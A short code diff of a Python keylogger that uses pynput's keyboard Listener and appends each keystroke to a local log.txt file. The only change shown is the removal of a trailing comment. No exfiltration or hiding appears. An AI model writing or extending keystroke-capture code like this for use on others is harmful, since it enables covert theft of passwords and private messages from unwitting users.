@@ -1,7 +1,7 @@
 from pynput.keyboard import Listener
 
 def addtofile(key):
-    keydata = str(key).replace("'", "")  # Remove quotes around the key representation
+    keydata = str(key).replace("'", "") 
     try:
         with open("log.txt", 'a') as f:
             if keydata == 'Key.space':
